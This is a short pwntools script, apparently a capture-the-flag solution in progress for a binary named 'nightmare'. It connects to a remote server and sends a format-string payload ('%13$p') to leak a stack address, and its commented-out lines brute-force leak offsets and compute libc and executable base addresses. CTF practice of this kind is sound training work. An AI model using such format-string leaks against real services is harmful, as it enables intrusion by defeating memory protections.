#!/usr/bin/python3

from pwn import * 

context.binary = exe = ELF('./nightmare')
#context.log_level = 'CRITICAL'
libc = exe.libc
#p = process()
p = remote('94.237.53.140',39513)
#gdb.attach(p,gdbscript='''
#           brva 0x0000000000001438
#           ''')
input()
#for i in range(50):
#    p = context.binary.process()
#    p.sendlineafter(b'> ', b'2')
#    p.sendlineafter(b'Enter the escape code>> ', f'%{i + 1}$p'.encode())  
#    print(i + 1, p.recvline(timeout=1))
    
p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'Enter the escape code>> ',b'%13$p')
#libc.address = int(p.recvline()[:-1],16) - libc.sym.__libc_start_main - 243

#log.info(f'libc: {hex(libc.address)}')
#p.sendlineafter(b'> ',b'xxxx')

#p.sendlineafter(b'> ',b'2')
#p.sendlineafter(b'>> ',b'%9$p')

#exe.address = int(p.recvline()[:-1],16) - 0x14d5

#log.info(f'exe: {hex(exe.address)}')


p.interactive()
